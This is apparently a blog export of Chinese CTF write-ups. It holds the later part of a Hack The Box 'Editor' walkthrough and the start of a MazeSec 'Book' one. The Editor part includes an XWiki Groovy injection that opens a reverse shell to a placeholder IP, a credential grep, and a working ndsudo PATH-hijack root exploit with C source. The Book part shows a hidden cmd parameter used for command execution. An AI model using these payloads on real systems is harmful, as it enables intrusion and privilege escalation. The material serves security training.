<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HTB/editor]</span><br><span class="line">└─$ curl <span class="string">&#x27;http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&amp;text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22busybox%20nc%20&#123;YOUR_IP&#125;%201234%20-e%20sh%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d&#x27;</span></span><br></pre></td></tr></table></figure>

<p>上面的 <code>YOUR_IP</code> 就是我们自己的 ip 地址。</p>
<p>接收到了反弹 shell ：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HTB/editor]</span><br><span class="line">└─$ nc -nvlp 1234</span><br><span class="line">Listening on 0.0.0.0 1234</span><br><span class="line">Connection received on 10.10.11.80 33762</span><br><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">xwiki@editor:/usr/lib/xwiki-jetty$</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们是 <code>xwiki</code> 用户，在 <code>home</code> 里面有个用户叫 <code>oliver</code> ，但是我们进不去：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xwiki@editor:/usr/lib/xwiki-jetty$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">xwiki</span><br><span class="line">xwiki@editor:/usr/lib/xwiki-jetty$ <span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line">xwiki@editor:/home$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">oliver</span><br><span class="line">xwiki@editor:/home$ <span class="built_in">cd</span> oliver</span><br><span class="line"><span class="built_in">cd</span> oliver</span><br><span class="line">bash: <span class="built_in">cd</span>: oliver: Permission denied</span><br><span class="line">xwiki@editor:/home$</span><br></pre></td></tr></table></figure>

<p>尝试一些基本的提权思路， <code>sudo -l</code> 、查看 <code>/etc/crontab</code> 、查看 <code>env</code> 等等，都没啥东西。</p>
<p>想到可能在哪里存在着密码，因此收集了一下密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xwiki@editor:/usr/lib/xwiki-jetty$ grep -rnoP <span class="string">&#x27;password.&#123;0,20&#125;&#x27;</span> / 2&gt;/dev/null  <span class="comment"># -r 递归搜索 -n 显示行号 -o 仅输出匹配部分 -P 用 Perl 正则表达式 &#x27;password.&#123;0,20&#125;&#x27; 表示匹配 &quot;password&quot; 及后面最多 20 个字符</span></span><br><span class="line">…………</span><br><span class="line">…………</span><br><span class="line">/etc/xwiki/hibernate.cfg.xml:104:password<span class="string">&quot;&gt;theEd1t0rTeam99&lt;/p</span></span><br><span class="line"><span class="string">/etc/xwiki/hibernate.cfg.xml:129:password&quot;</span>&gt;xwiki&lt;/property&gt;</span><br><span class="line">/etc/xwiki/hibernate.cfg.xml.ucf-dist:104:password<span class="string">&quot;&gt;xwikipassword2025&lt;</span></span><br></pre></td></tr></table></figure>

<p>发现了三个密码，经过尝试发现，<code>theEd1t0rTeam99</code> 是 <code>oliver</code> 用户的密码，ssh 登录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HTB/editor]</span><br><span class="line">└─$ ssh oliver@editor.htb       </span><br><span class="line">oliver@editor.htb<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-151-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/pro</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> System information as of Tue Aug 19 01:35:57 AM UTC 2025</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:  0.05              Processes:             233</span></span><br><span class="line"><span class="string">  Usage of /:   71.0% of 7.28GB   Users logged in:       0</span></span><br><span class="line"><span class="string">  Memory usage: 54%               IPv4 address for eth0: 10.10.11.80</span></span><br><span class="line"><span class="string">  Swap usage:   0%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Expanded Security Maintenance for Applications is not enabled.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">4 updates can be applied immediately.</span></span><br><span class="line"><span class="string">To see these additional updates run: apt list --upgradable</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">4 additional security updates can be applied with ESM Apps.</span></span><br><span class="line"><span class="string">Learn more about enabling ESM Apps service at https://ubuntu.com/esm</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The list of available updates is more than a week old.</span></span><br><span class="line"><span class="string">To check for new updates run: sudo apt update</span></span><br><span class="line"><span class="string">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">oliver@editor:~$ ls</span></span><br><span class="line"><span class="string">user.txt</span></span><br><span class="line"><span class="string">oliver@editor:~$ cat user.txt</span></span><br><span class="line"><span class="string">36fa3c9304f3a9a904889e19d4a68b46</span></span><br><span class="line"><span class="string">oliver@editor:~$ </span></span><br></pre></td></tr></table></figure>

<p><code>oliver</code> 用户 <code>sudo -l</code> 仍然没有东西。</p>
<p>查找一下具有 <code>SUID</code> 权限的文件:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">oliver@editor:~$ find / -perm -4000 2&gt;/dev/null</span><br><span class="line">/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network</span><br><span class="line">/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin</span><br><span class="line">/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners</span><br><span class="line">/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo</span><br><span class="line">/opt/netdata/usr/libexec/netdata/plugins.d/ioping</span><br><span class="line">/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin</span><br><span class="line">/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/fusermount3</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/libexec/polkit-agent-helper-1</span><br><span class="line">oliver@editor:~$ </span><br></pre></td></tr></table></figure>

<p>发现了几个在 <code>/opt/netdata</code> 这个不太寻常的目录的文件，看一下他们的权限等信息:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">oliver@editor:~$ <span class="built_in">ls</span> -liah /opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network</span><br><span class="line">49126 -rwsr-x--- 1 root netdata 943K Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network</span><br><span class="line">oliver@editor:~$ <span class="built_in">ls</span> -liah /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo</span><br><span class="line">49411 -rwsr-x--- 1 root netdata 196K Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo</span><br><span class="line">oliver@editor:~$</span><br></pre></td></tr></table></figure>

<p>可以看到是一些在 <code>netdata</code> 用户组的，有 <code>SUID</code> 权限的文件。</p>
<p>看一下我们的用户组:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">oliver@editor:/tmp$ <span class="built_in">id</span></span><br><span class="line">uid=1000(oliver) gid=1000(oliver) <span class="built_in">groups</span>=1000(oliver),999(netdata)</span><br></pre></td></tr></table></figure>

<p>我们刚好就在 <code>netdata</code> 这个用户组里，因此我们对这些文件有执行权限。所以，如果这些文件哪个有漏洞的话，我们说不定可以用这些程序来提权到  <code>root</code>。</p>
<p>经过搜索发现，<code>ndsudo</code> 这个程序刚好有本地提权漏洞，<code>CVE-2024-32019</code>。在<a href="https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93">这里</a>是这么说的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">该 ndsudo 工具被打包为一个 root 拥有权限的可执行文件，并设置了 SUID 位。</span><br><span class="line">它仅运行一组有限的外部命令，但其搜索路径由环境变量提供PATH。这使得攻击者可以控制ndsudo这些命令的查找位置，而这些路径可能是攻击者具有写权限的路径。</span><br></pre></td></tr></table></figure>

<p>意思就是说，这个 <code>ndsudo</code> 程序存在 <strong>PATH</strong> 劫持，我们可以修改环境变量 <strong>PATH</strong>，然后把我们想执行的命令放到它要执行的 <strong>命令程序</strong> 上就好了。</p>
<p>我们先 <code>-h</code> 看看这个程序是怎么用的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo -h</span><br><span class="line"></span><br><span class="line">ndsudo</span><br><span class="line"></span><br><span class="line">(C) Netdata Inc.</span><br><span class="line"></span><br><span class="line">A helper to allow Netdata run privileged commands.</span><br><span class="line"></span><br><span class="line">  --<span class="built_in">test</span></span><br><span class="line">    <span class="built_in">print</span> the generated <span class="built_in">command</span> that will be run, without running it.</span><br><span class="line"></span><br><span class="line">  --<span class="built_in">help</span></span><br><span class="line">    <span class="built_in">print</span> this message.</span><br><span class="line"></span><br><span class="line">The following commands are supported:</span><br><span class="line"></span><br><span class="line">- Command    : nvme-list</span><br><span class="line">  Executables: nvme </span><br><span class="line">  Parameters : list --output-format=json</span><br><span class="line"></span><br><span class="line">- Command    : nvme-smart-log</span><br><span class="line">  Executables: nvme </span><br><span class="line">  Parameters : smart-log &#123;&#123;device&#125;&#125; --output-format=json</span><br><span class="line"></span><br><span class="line">- Command    : megacli-disk-info</span><br><span class="line">  Executables: megacli MegaCli </span><br><span class="line">  Parameters : -LDPDInfo -aAll -NoLog</span><br><span class="line"></span><br><span class="line">- Command    : megacli-battery-info</span><br><span class="line">  Executables: megacli MegaCli </span><br><span class="line">  Parameters : -AdpBbuCmd -aAll -NoLog</span><br><span class="line"></span><br><span class="line">- Command    : arcconf-ld-info</span><br><span class="line">  Executables: arcconf </span><br><span class="line">  Parameters : GETCONFIG 1 LD</span><br><span class="line"></span><br><span class="line">- Command    : arcconf-pd-info</span><br><span class="line">  Executables: arcconf </span><br><span class="line">  Parameters : GETCONFIG 1 PD</span><br><span class="line"></span><br><span class="line">The program searches <span class="keyword">for</span> executables <span class="keyword">in</span> the system path.</span><br><span class="line"></span><br><span class="line">Variables given as &#123;&#123;variable&#125;&#125; are expected on the <span class="built_in">command</span> line as:</span><br><span class="line">  --variable VALUE</span><br><span class="line"></span><br><span class="line">VALUE can include space, A-Z, a-z, 0-9, _, -, /, and .</span><br><span class="line"></span><br><span class="line">oliver@editor:~$ </span><br></pre></td></tr></table></figure>

<p>可以看到，说明里的 <code>Command</code> 应该是这个程序后跟的命令，<code>Executables</code> 应该是这个 <code>Command</code> 靠谁来执行？猜测是这样的。</p>
<p>先 <code>ndsudo nvme-list</code> 看看：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list</span><br><span class="line">nvme : not available <span class="keyword">in</span> PATH.</span><br><span class="line">oliver@editor:~$</span><br></pre></td></tr></table></figure>

<p>他说 <code>nvme</code> 不在环境变量里面，说明它应该是靠 <code>nvme</code> 这个命令来执行的 <code>nvme-list</code>。</p>
<p>那根据前面的漏洞描述，我们伪造一个 <code>nvme</code>，并且把环境变量改成我们伪造的文件存在的目录试试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">oliver@editor:~$ <span class="built_in">cd</span> /tmp</span><br><span class="line">oliver@editor:/tmp$ <span class="built_in">echo</span> <span class="string">&#x27;cp /bin/bash /tmp/bash;chmod +s /tmp/bash&#x27;</span> &gt;nvme</span><br><span class="line">oliver@editor:/tmp$ <span class="built_in">chmod</span> +x nvme</span><br><span class="line">oliver@editor:/tmp$ <span class="built_in">ls</span></span><br><span class="line">netdata-ipc                                                                     systemd-private-6170d413b78c49dd8d1d9b1f52784de6-systemd-resolved.service-yUjcht</span><br><span class="line">nvme                                                                            systemd-private-6170d413b78c49dd8d1d9b1f52784de6-systemd-timesyncd.service-M4Lfhd</span><br><span class="line">systemd-private-6170d413b78c49dd8d1d9b1f52784de6-ModemManager.service-NEiIAO    systemd-private-6170d413b78c49dd8d1d9b1f52784de6-xwiki.service-6KeAcG</span><br><span class="line">systemd-private-6170d413b78c49dd8d1d9b1f52784de6-systemd-logind.service-vCq8Zq  vmware-root_590-2688750742</span><br><span class="line">oliver@editor:/tmp$ <span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line">oliver@editor:/tmp$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span><br><span class="line">oliver@editor:/tmp$</span><br></pre></td></tr></table></figure>

<p>现在我创建好了一个假的 <code>nvme</code> 和假的 <code>PATH</code> ，再 <code>ndsudo nvme-list</code> 试试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list</span><br><span class="line">execve: Exec format error</span><br><span class="line">oliver@editor:/tmp$</span><br></pre></td></tr></table></figure>

<p>他这次说 <code>Exec format error</code> ，也就是他应该找到了我们创建的假的 <code>nvme</code>，但是他不能运行这个假的 <code>nvme</code>，又因为这里是 <code>execve</code> 报错，我就把这个情况仍给 Deepseek ，让他给我解答一下。</p>
<p>Deepseek 给我的解答是，如果想让 <code>execve</code> 成功执行这个文件，这个文件里面必须添加 <strong>Shebang 声明解释器</strong> ，否则 <code>execve</code> 会报错。</p>
<p>那我们在假的 <code>nvme</code> 里面添加 <code>#!/bin/sh</code> 之后，再来试一下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">oliver@editor:/tmp$ <span class="built_in">cat</span> nvme</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">cp</span> /bin/bash /tmp/bash</span><br><span class="line"><span class="built_in">chmod</span> +s /tmp/bash</span><br><span class="line">oliver@editor:/tmp$ <span class="built_in">chmod</span> +x nvme</span><br></pre></td></tr></table></figure>

<p>然后执行 <code>ndsudo</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list</span><br><span class="line">oliver@editor:/tmp$ <span class="built_in">ls</span> -liah</span><br><span class="line">total 1.4M</span><br><span class="line">394838 drwxrwxrwt  8 root    root    4.0K Aug 19 06:29 .</span><br><span class="line">     2 drwxr-xr-x 18 root    root    4.0K Jul 29 11:55 ..</span><br><span class="line">393318 -rwsr-sr-x  1 oliver  oliver  1.4M Aug 19 06:29 bash</span><br><span class="line">394418 srwxrwx---  1 netdata netdata    0 Aug 18 19:35 netdata-ipc</span><br><span class="line">393351 -rwxrwxr-x  1 oliver  oliver    52 Aug 19 06:28 nvme</span><br><span class="line">393522 drwx------  3 root    root    4.0K Aug 18 19:35 systemd-private-6170d413b78c49dd8d1d9b1f52784de6-ModemManager.service-NEiIAO</span><br><span class="line">393363 drwx------  3 root    root    4.0K Aug 18 19:35 systemd-private-6170d413b78c49dd8d1d9b1f52784de6-systemd-logind.service-vCq8Zq</span><br><span class="line">393355 drwx------  3 root    root    4.0K Aug 18 19:35 systemd-private-6170d413b78c49dd8d1d9b1f52784de6-systemd-resolved.service-yUjcht</span><br><span class="line">393357 drwx------  3 root    root    4.0K Aug 18 19:35 systemd-private-6170d413b78c49dd8d1d9b1f52784de6-systemd-timesyncd.service-M4Lfhd</span><br><span class="line">393362 drwx------  3 root    root    4.0K Aug 18 19:35 systemd-private-6170d413b78c49dd8d1d9b1f52784de6-xwiki.service-6KeAcG</span><br><span class="line">393359 drwx------  2 root    root    4.0K Aug 18 19:36 vmware-root_590-2688750742</span><br><span class="line">oliver@editor:/tmp$</span><br></pre></td></tr></table></figure>

<p>可以看到这次执行没有报错，而且我们也获得了一个具有 SUID 权限的 <code>bash</code>。</p>
<p>但是！我突然发现，这个 <code>bash</code> 的所属用户，居然是 <code>oliver</code>，他不是 <code>root</code> ！</p>
<p>这就有意思了，用这个 <code>bash -p</code>，得到的也自然是 <code>oliver</code> 的权限，而不是 <code>root</code> 的。</p>
<p>为了测试看看这个脚本到底是谁执行的，我在 <code>nvme</code> 里面替换成 <code>id</code> 看看：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">oliver@editor:/tmp$ <span class="built_in">cat</span> nvme</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list</span><br><span class="line">uid=1000(oliver) gid=1000(oliver) <span class="built_in">groups</span>=1000(oliver),999(netdata)</span><br></pre></td></tr></table></figure>

<p>OK，他说他是 <code>oliver</code> ，不是 <code>root</code> ，那说明我们用这样的方法无法拿到 <code>root</code> 的权限。</p>
<p>按理来说，有 <code>SUID</code> 程序的劫持 <code>PATH</code> 的提权，构造一个 <code>shebang</code> 脚本就好了，但这里不行，不知道为什么。</p>
<p>为此，我去<a href="https://github.com/Stars1233/netdata/blob/master/src/collectors/utils/ndsudo.c">这里</a>看了一下 <code>ndsudo</code> 的代码。</p>
<p>可以看到，这段代码主要的漏洞点在这里:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *path = getenv(<span class="string">&quot;PATH&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>他是直接从环境变量中拿的 <code>path</code> ，所以存在劫持。</p>
<p>他的修改在这里：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> new_path[] = <span class="string">&quot;PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin&quot;</span>;</span><br><span class="line">putenv(new_path);</span><br></pre></td></tr></table></figure>

<p>也就是说，他自己在代码里面修改了一个新的 <code>PATH</code> 。</p>
<p>所以，如果我们把这两行删掉，应该就能获得一个有漏洞的 <code>ndsudo</code> 的版本了。</p>
<p>删掉上述两行修补漏洞的代码之后，我在本地的 kali 上装了一个新的 <code>ndsudo</code> ，并且用 <strong>shebang</strong> 脚本尝试提权：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HTB/editor]</span><br><span class="line">└─$ <span class="built_in">ls</span> -liah</span><br><span class="line">1323470 -rwsr-x---  1 root kali  72K Aug 28 11:19 ndsudo</span><br><span class="line">1348060 -rw-rw-r--  1 kali kali  13K Aug 28 11:18 ndsudo.c</span><br><span class="line">1348051 -rwxrwxr-x  1 kali kali   23 Aug 28  2025 nvme</span><br><span class="line">1348061 -rw-rw-r--  1 kali kali  243 Aug 28 11:18 nvme.c</span><br><span class="line">┌──(kali㉿kali)-[~/HTB/editor]</span><br><span class="line">└─$ <span class="built_in">cat</span> nvme</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure>

<p>执行 <code>ndsudo</code> ：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HTB/editor]</span><br><span class="line">└─$ ./ndsudo nvme-list</span><br><span class="line">root@kali:/home/kali/HTB/editor# <span class="built_in">whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>提权成功了，不知道为什么靶机上的不太行，可能对源代码做了一些修改，或者是 linux 权限问题之类的。</p>
<p>既然靶机上的 <strong>shebang</strong> 脚本不能成功，那我们就造一个 <code>ELF</code> 文件去执行，应该是可以成功的。</p>
<p><code>nvme.c</code> 的内容如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setuid(<span class="number">0</span>); <span class="comment">// 设置用户 ID 为 root (0)</span></span><br><span class="line">    setgid(<span class="number">0</span>); <span class="comment">// 设置组 ID 为 root (0)</span></span><br><span class="line">    system(<span class="string">&quot;cp /bin/bash /tmp/bash;chmod +s /tmp/bash&quot;</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 <code>x86-64</code> 架构的机器上编译它，如果是 <code>arm</code> 架构的 macbook ，可以在 <code>UTM</code> 上创建一个 <code>x86-64</code> 的 linux 去进行编译。</p>
<p>把编译好的程序传进靶机里，构造假的 <code>PATH</code> ，执行 <code>ndsudo</code> ：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">oliver@editor:/tmp$ <span class="built_in">chmod</span> +x nvme</span><br><span class="line">oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list</span><br><span class="line">oliver@editor:/tmp$ <span class="built_in">ls</span> -liah</span><br><span class="line">total 2.2M</span><br><span class="line">394838 drwxrwxrwt  8 root    root    4.0K Aug 28 06:41 .</span><br><span class="line">     2 drwxr-xr-x 18 root    root    4.0K Jul 29 11:55 ..</span><br><span class="line">393351 -rwsr-sr-x  1 root    root    1.4M Aug 28 06:41 bash</span><br><span class="line">394418 srwxrwx---  1 netdata netdata    0 Aug 28 03:22 netdata-ipc</span><br><span class="line">393318 -rwxrwxr-x  1 oliver  oliver  791K Aug 18 07:41 nvme</span><br></pre></td></tr></table></figure>

<p>这次拿到的是具有 <code>root</code> 的 <code>SUID</code> 权限的 <code>bash</code>，用 <code>bash -p</code> 进行提权：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">oliver@editor:/tmp$ /tmp/bash -p</span><br><span class="line">bash-5.1# <span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">bash-5.1#</span><br></pre></td></tr></table></figure>

<p>拿 <code>root flag</code> ：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash-5.1# <span class="built_in">cat</span> root.txt</span><br><span class="line">38661a9fa285cfd2465286e72644b3c5</span><br></pre></td></tr></table></figure>

<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>前面说到我去 <strong>github</strong> 上找了 <strong>ndsudo</strong> 的源码，然后在本地的 kali 上用 <strong>shebang</strong> 脚本提权成功了，但是靶机里面没有成功。</p>
<p>但我打完之后把靶机里的 <strong>ndsudo</strong> 拿出来用 <code>IDA</code> 看了一下，发现靶机里的 <strong>ndsudo</strong> 里面是没有 <code>setuid(0)</code> 的，但是 <strong>github</strong> 上的那个代码里面就有 <code>setuid(0)</code>，怪不得 <strong>github</strong> 上的代码就可以用 <strong>shebang</strong> 脚本提权成功…………</p>
]]></content>
      <tags>
        <tag>Hack The Box</tag>
        <tag>netdata</tag>
      </tags>
  </entry>
  <entry>
    <title>MazeSec-Book</title>
    <url>/2025/08/15/MazeSec-Book/</url>
    <content><![CDATA[<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/book]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap -p- 192.168.43.12          </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 15:36 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Book (192.168.43.12)</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">443/tcp  open  https</span><br><span class="line">MAC Address: C6:08:CB:68:1C:66 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.33 seconds</span><br></pre></td></tr></table></figure>

<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>开启了 80 和 443 端口，访问 80 端口之后，给我重定向到了 HTTPS，进去是个开源的 csTimer ，魔方训练用的计时器：</p>
<p><img src="image1.webp" alt="image1"></p>
<p>一开始的时候在 web 上尝试了挺长时间的，但都没有找到哪里有入口点。</p>
<p>后来看了群友的 wp ，发现居然在主页面里面藏了一个可以进行命令执行的参数 <code>cmd</code> ，这个得自己 FUZZ 出来，也是没想到。</p>
<p>FUZZ 一下看看：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/book]</span><br><span class="line">└─$ wfuzz -u <span class="string">&#x27;http://192.168.43.12/?FUZZ=id&#x27;</span> -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt --hh 54850</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: http://192.168.43.12/?FUZZ=id</span></span><br><span class="line"><span class="string">Total requests: 74332</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word       Chars       Payload                                                                                                           </span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000002798:   200        358 L    4242 W     54903 Ch    &quot;cmd&quot;</span></span><br></pre></td></tr></table></figure>

<p>FUZZ 出来有个 cmd 参数和别的响应不太一样，访问之后，发现回显里面有命令执行的内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/book]</span><br><span class="line">└─$ curl <span class="string">&#x27;http://192.168.43.12?cmd=id&#x27;</span>    </span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 4.01//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html manifest=<span class="string">&quot;cache.manifest&quot;</span>&gt;</span><br><span class="line"> &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">  &lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;meta name=<span class="string">&quot;apple-mobile-web-app-capable&quot;</span> content=<span class="string">&quot;yes&quot;</span>&gt;</span><br><span class="line">  &lt;meta name=<span class="string">&quot;apple-mobile-web-app-status-bar-style&quot;</span> content=<span class="string">&quot;default&quot;</span>&gt;</span><br><span class="line">  &lt;meta name=<span class="string">&quot;format-detection&quot;</span> content=<span class="string">&quot;telephone=no&quot;</span>&gt;</span><br><span class="line">  …………</span><br><span class="line">  …………</span><br><span class="line">  &lt;/tbody&gt;&lt;/table&gt;</span><br><span class="line">  &lt;/body&gt;&lt;/html&gt;</span><br><span class="line">  uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure>

<h2 id="获取立足点"><a href="#获取立足点" class="headerlink" title="获取立足点"></a>获取立足点</h2><p>然后尝试进行反弹 shell ，但是用 <code>busybox nc</code> 和正常的 <code>bash</code> 进行反弹 shell 都没有成功，因而想到上传一个 <code>meterpreter</code> 的木马好了：</p>
